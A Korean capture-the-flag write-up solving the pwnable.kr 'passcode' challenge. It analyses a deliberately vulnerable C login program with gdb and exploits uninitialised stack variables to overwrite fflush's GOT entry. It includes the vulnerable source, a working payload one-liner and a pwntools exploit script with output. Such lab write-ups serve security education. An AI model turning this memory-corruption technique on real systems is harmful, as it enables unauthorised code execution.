---
title: "[pwnable.kr]Toddler/passcode"
tags: [pwnable.kr, Toddler's Bottle, writeup]
author: eli_ez3r
key: 20180054
category: write-up
date: 2018-09-15 00:00:00 +0900
modify_date: 2018-09-15
article_header:
  type: cover
  image:
    src: /assets/img/write-up/pwnable_kr.png
---

-----

```
Mommy told me to make a passcode based login system.
My initial C code was compiled without any error!
Well, there was some compiler warning, but who cares about that?

ssh passcode@pwnable.kr -p2222 (pw:guest)
```

-----

```c
#include <stdio.h>
#include <stdlib.h>

void login(){
        int passcode1;
        int passcode2;

        printf("enter passcode1 : ");
        scanf("%d", passcode1);
        fflush(stdin);

        // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
        printf("enter passcode2 : ");
        scanf("%d", passcode2);

        printf("checking...\n");
        if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
                exit(0);
        }
}

void welcome(){
        char name[100];
        printf("enter you name : ");
        scanf("%100s", name);
        printf("Welcome %s!\n", name);
}

int main(){
        printf("Toddler's Secure Login System 1.0 beta.\n");

        welcome();
        login();

        // something after login...
        printf("Now I can safely trust you that you have credential :)\n");
        return 0;
}
```

-----

### 0x00. Analysis

main함수에서는 welcome함수와 login함수를 순차적으로 호출한다.

welcome함수는 이름을 입력 받고 name배열에 저장한다.

login함수는 passcode1과 passcode2를 입력 받는다.

그런데 좀 이상했다.

```c
int passcode1;
scanf("%d", passcode1);
```

이거 대학교 1학년 c언어 시간에 많이 하는 실수 아닌가? ㅋㅋㅋㅋㅋ

```c
scanf("%d", &passcode1);
```

scanf함수는 2번째 인자로 주소를 넘겨주어야 한다.

-----

따라서 변수  passcode1이 가리키고 있는 주소를 알아야 한다.

```
gdb-peda$ disas login
Dump of assembler code for function login:
   ----생략----
   0x08048577 <+19>:    mov    eax,0x8048783
   0x0804857c <+24>:    mov    edx,DWORD PTR [ebp-0x10]
   0x0804857f <+27>:    mov    DWORD PTR [esp+0x4],edx
   0x08048583 <+31>:    mov    DWORD PTR [esp],eax
=> 0x08048586 <+34>:    call   0x80484a0 <__isoc99_scanf@plt>
   0x0804858b <+39>:    mov    eax,ds:0x804a02c
  ----생략----
```

`login+24(mov edx,DWORD PTR [ebp-0x10])` 부분을 보면 passcode1은 `ebp-0x10` 임을 알 수 있다.

```
gdb-peda$ x/wx $ebp-0x10
0xffffd4f8:     0xffffd554
```

해당 주소는 `0xffffd4f8` 이고 이 주소에 있는 값 `0xffffd554`주소에 값이 쓰여질 것이다. 확인해보자.

```
gdb-peda$ ni
enter passcode1 : 10
gdb-peda$ x/wx $ebp-16
0xffffd4f8:     0xffffd554
gdb-peda$ x/wx 0xffffd554
0xffffd554:     0x0000000a
```

`10`을 입력하여 `0xffffd554`에 저장되는 것을 알 수 있다.

그런데 여기서 passcode1은 정의 시 초기화 되지 않았으며, 운 좋게 **쓰레기 값**으로 `0xffffd554`라는 값이 들어 있었으며 이 공간은 스택 공간으로 쓰기가 가능했다.

-----

passcode2로 똑같이 살펴보면,

```
gdb-peda$ pdisas login
Dump of assembler code for function login:
   ----생략----
   0x080485a5 <+65>:    mov    eax,0x8048783
   0x080485aa <+70>:    mov    edx,DWORD PTR [ebp-0xc]
   0x080485ad <+73>:    mov    DWORD PTR [esp+0x4],edx
   0x080485b1 <+77>:    mov    DWORD PTR [esp],eax
=> 0x080485b4 <+80>:    call   0x80484a0 <__isoc99_scanf@plt>
   0x080485b9 <+85>:    mov    DWORD PTR [esp],0x8048799
   ----생략----
End of assembler dump.
```

`ebp-0xc`이 passcode2의 변수 공간이며 이 주소에 있는 값을 주소로 참조하여 값이 쓰여 질 것이다.

```
gdb-peda$ x/wx $ebp-0xc
0xffffd4fc:     0xdee59400
gdb-peda$ x/wx 0xdee59400
0xdee59400:     Cannot access memory at address 0xdee59400
```

`ebp-0xc`에는 `0xdee59400`이라는 값이 들어있으면 이 값은 딱 봐도 주소 값이 아닌 쓰레기 값이다. 이 값을 scanf에 주소로 넘겨주어 쓰기를 시도할 것이 때문에 에러가 발생할 것이다.

```
gdb-peda$ ni
enter passcode2 : 20
Program received signal SIGSEGV, Segmentation fault.
```

역시나 `Segmentation fault.`가 출력 된다.

-----

그러면 우리는 초기화 되지 않는 passcode1 변수와 passcode2 변수를 덮어 씌워야 한다.

> 이 부분에서 많은 고민과 삽질이 있었다.

결론적으로는 welcome함수를 이용해야 했다.

main함수에서  welcome함수를 호출하고 곧바로 login함수를 호출한다.

프로그램이 스택 메모리를 사용하는 원리를 알고 있다면, welcome함수 이후 login함수를 호출할 때 welcome함수에서 사용한 스택영역을 다시 사용해 login함수에서 사용하고 남은 쓰레기 값들이 있다는 것을 알것이다.

-----

두 함수가 각각 호출될 때 ebp를 확인해 봤다.

```
Breakpoint 1, 0x0804860c in welcome ()
gdb-peda$ x/wx $ebp
0xffffd508:     0xffffd528
```

```
Breakpoint 2, 0x08048567 in login ()
gdb-peda$ x/wx $ebp
0xffffd508:     0xffffd528
```

welcome함수와 login함수의 ebp를 비교해보니 똑같은 것을 알 수 있다.

<img src="http://eliez3r.synology.me/assets/img/writeup/pwnable.kr/passcode/01.png" width="600px">

각 함수의 메모리 스택을 비교해보면 위 그림과 같다.

welcome함수에서 name배열에 100byte를 입력 받을 때 마지막 4byte가 passcode1의 주소와 같다.

즉, passcode1의 값은 덮어쓸 수 있지만 passcode2의 값을 덮어 씌우는 방법은 찾지 못했다. ~~(방법이 있을려나? ㅠㅠ)~~

그래도 passcode1의 값을 변경하면 원하는 주소에 원하는 값을 넣을 수 있다. 이점을 이용하여 flag를 알아내야한다.

> 여기에서 2번째 삽질과 많은 고민이 있었다.

-----

결론적으로 passcode1의 scanf함수가 호출되고 바로 다음의 fflush함수가 호출되는 점을 이용하였다.

```c
void login(){
        int passcode1;
        int passcode2;

        printf("enter passcode1 : ");
        scanf("%d", passcode1);
        fflush(stdin);
    //생략
}
```

바로 fflush의 got를 이용하는 것 이였다. (참조 : [PLT와 GOT를 파헤쳐보자](https://eliez3r.github.io/post/2019/11/15/study-system-plt_got.html))

<img src="http://eliez3r.synology.me/assets/img/writeup/pwnable.kr/passcode/02.png" width="600px">

fflush의 got주소를 프로그램 내의 flag를 출력하는 system 코드 주소로 변경하면 fflush가 실행될 때 system함수를 호출하여 flag를 출력하지 않을까 하는 생각에 진행하였다. (아래 코드 부분)

```c
system("/bin/cat flag");
```

-----

```
gdb-peda$ pdisas login
Dump of assembler code for function login:
  ----생략----
   0x0804858b <+39>:    mov    eax,ds:0x804a02c
   0x08048590 <+44>:    mov    DWORD PTR [esp],eax
   0x08048593 <+47>:    call   0x8048430 <fflush@plt>
   ----생략----
End of assembler dump.
```

`fflush@plt` 주소는 `0x8048430` 이다.

```
gdb-peda$ x/3i 0x8048430
   0x8048430 <fflush@plt>:      jmp    DWORD PTR ds:0x804a004
   0x8048436 <fflush@plt+6>:    push   0x8
   0x804843b <fflush@plt+11>:   jmp    0x8048410
```

`fflush@got`  주소는 `0x804a004` 이다.

-----

```c
system("/bin/cat flag");
```

그리고 system 함수로 flag를 출력하는 코드 영역 부분의 주소를 구해야 한다.

```
gdb-peda$ pdisas login
Dump of assembler code for function login:
   ----생략----
   0x080485e3 <+127>:   mov    DWORD PTR [esp],0x80487af
   0x080485ea <+134>:   call   0x8048460 <system@plt>
   ----생략----
End of assembler dump.
```

system함수를 실행하기 위한 부분은 `0x080485e3` 주소이다.

-----

이제 준비는 끝났다.

name배열의 마지막 4byte에 `fflush@got`주소를 넣고 사용자로부터 passcode1의 입력을 받을 때, system코드 주소(`0x080485e3`)를 입력하면 된다.

> 0x080485e3 = 134514147

-----

### 0x01. Exploit

```
passcode@prowl:~$ (python -c 'print "A"*96+"\x04\xa0\x04\x08"';cat)|./passcode
Toddler's Secure Login System 1.0 beta.
enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA♦�!
134514147
Sorry mom.. I got confused about scanf usage :(
enter passcode1 : Now I can safely trust you that you have credential :)
```

##### python

```python
from pwn import *

conn = ssh("passcode", "pwnable.kr", port=2222, password="guest")
p = conn.process("./passcode")

fflush_got = 0x804a004
system = 0x80485e3

payload  = "A"*96
payload += p32(fflush_got)

p.recv()
p.sendline(payload)
p.recv()
p.sendline("134514147")
print p.recv()
p.close()
conn.close()
```

```
root@ubuntu:~/pwnable/passcode# python ex.py
[+] Connecting to pwnable.kr on port 2222: Done
[*] fd@pwnable.kr:
    Distro    Ubuntu 16.04
    OS:       linux
    Arch:     amd64
    Version:  4.4.179
    ASLR:     Enabled
[+] Starting remote process './passcode' on pwnable.kr: pid 218086
Sorry mom.. I got confused about scanf usage :(
Now I can safely trust you that you have credential :)

[*] Stopped remote process 'passcode' on pwnable.kr (pid 218086)
[*] Closed connection to 'pwnable.kr'
```

-----

